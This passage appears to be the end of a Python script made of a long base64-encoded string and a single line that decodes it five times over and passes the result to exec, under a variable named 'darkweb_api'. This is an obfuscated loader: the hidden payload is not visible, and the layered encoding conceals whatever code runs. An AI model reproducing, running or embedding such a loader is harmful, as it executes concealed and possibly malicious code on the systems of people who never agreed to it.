WhOVjJoc1VtcHNkMWRyVVhka01IaElUVmhDYVdKRWJIZFhhMUYzWkRCNFNGSnRkR0ZTYW13eVYyMHhZV1ZzY0ZsVlZHeE9VVE5vZGxkV2FFOWlNVUpWVVZoQ1RGVlhPVzVUVlU1Q1dqQnNSRkZYWkVwU2VrWnpXWHBPVDJGR2IzbFdWMlJSVlRCS00xbHFUazlOUjA0MVRsaFNZVmRGTlRaWFZtUnJZa2ROZUdNelpGbFZlbFl3VjJ4b1QyVnNiRmhhUjNoRVlWVkdibE5WVGtKYU1HeEVVVmRrYUZZeGJHNVpNR00xWlcxU1NWUllWbWxXTVZvMldYcEtSMkpzY0ZsVWJVcE9VbXBDTVZsc1pGZGxiVTE1VW0wMVlWVjZWblJaVm1NeFlUQjBSRk5zY0dsTk1WWnVXV3hvVjJWdFVrUlJibkJyVWpCWk1WTlhiSEphTUd4VlRVZGtUVlpGVm01WmFrNUtXakpPU0U5WWNHdFRSVEV4V1d4a1YyVnRUWGxTYlRWaFYwVTFhVlJWV1hka1YwcFlWbTV3YWsxclduVlhiRTB4WWxkR1dFNVhkRXhSTUhCU1dXdGtWMkZIVFhsV1YyUnFUVEZLYjFwV1RrTmtiVXB3VTFoQ1NsRXdWVFZUVlUxM1pVVTVibUl5WkVwUk1FWnVVMVZPUWxvd2JFUlJWMlJLVTBVMWMxZFliRUpQVld4SlUyMTRUV0pXY0hkWmJURlRZVWRLU0dReU9VdGxWMmhwVjBWYU5HRXdlSE5OU0VaWlVtNW9jbE16YkhKaWEzaEVVVzVTWVZkRk5UWlhWbVJyWWtWMFVtSXlaRXBSTUVadVUxVk9RbG93YkVSUlYyUktVMFpKZUZsdE1XdGliVkpVWVVoQ2FXSnNSblpaZWtwWFlXeGtObEZ0VWt4Vk1uUk1VMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZUa05sYlVwSVZtMTRhbEV5WkRSVE1VWjJXakJzUkZGWFpFcFJNRVp1VTFWT1Fsb3diRWxSYmxwcVRURktObE5WVVhkYU1XdDVaVWhDWVZaNlZYZFRNRlpyWWtkU1JtRklRbXBOTVVveVdUSTFjMVV4Y0ZsU2FrWmhWMFUwZDFNd2FFTmlSbkJaVTFSc1drMXRhRzlaYlRBeFlrZEtSMDlYZUdsaWJFcDNXa1ZvY21NeVNraGlTRkpvVjBaRk5WUlhiRFJrYkhCMFYyNXdZVmRHU20xWGEyUkhUVVp3VlUxVk9XbE5hbFp6VkVWak5XSldjSFZVYlhoclVtcHNkMWRyVVhka01IaElUVmRvYkZKcWJIZFhhMUYzWkRCNFNFMVlRbWxpUkd4M1YydFJkMlF3ZUVoU2JYUmhVbXBzTWxkdE1XRmxiSEJaVlZSc1RsRXphSFpYVm1oUFlqRkNWVkZZUWt4VlZ6bHVVMVZPUWxvd2JFUlJWMlJLVVRCR2JsTlZZM2hpUjAxNlZHMW9ZVTFzV2pWWGJHaE9XakZDVkZGdVpHbE5NRFIzV1ROck1XUkdjRmxVYm5CYVZqSlNjMWw2Um5wbFJtaFVUbGhTWVZkRk5UWlhWbVJyWWtWT2NGRlhaRXBSTUVadVUxVk9RbG93YkVSUlYyUnFUVzVvYzFkc2FFSmlNREZ3WVRCMFNsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwUk1FbzJXbFpvVG1SWFRYcFZiWFJwVFRGWmQxUkhNV0ZqTWxKWlZHMDVURkV5ZEV4VFZVNUNXakJzUkZGWFpFcFJNRVp1VTFWT1EyVnRWbGxVV0ZacVRURktjbGxxVGxkTlJYaDFXa2hzYUZkR1NuTlRNRTVLV2pKYVNXUXlaRXBoV0ZJd1YyeG9UMlZzYkZoYVIzaHFZbFphTmxNemJFcGhWWFJTWWpKa1NsRXdSbTVUVlU1Q1dqQnNSRkZYWkVwVFJUUXhXVE5yTVdWdFVraFZibHByVjBaR01WZHRNVFJOVjAxNVdqSTVURlZYT1c1VFZVNUNXakJzUkZGWFpFcFNNVnA2V1hwS1ZrNXJUbkJSVjJSS1VUQkdibE5WVGtKYU1HeEVVVmRrYWsweWVEWlVSelZQVFVad1NFOVVSbXRSZWxaMFdXdG9WMlZ0UmtSYU0wSkVZVlZHYmxOVlRrSmFNR3hFVVZka1NsRXdSbTVaTUdSSFpXMU9NMkl3ZEdGaVYzZ3hWMVprTkdNeVZsVmlNSFJLVVRCR2JsZFVTalJqUm5CWVRsUkNUV0pXU25kWmVrcFBaRzFLZEU1WGVGcE5NVVoyVXpGR2RsTjNQVDA9"
exec(base64.b64decode(base64.b64decode(base64.b64decode(base64.b64decode(base64.b64decode(darkweb_api))))))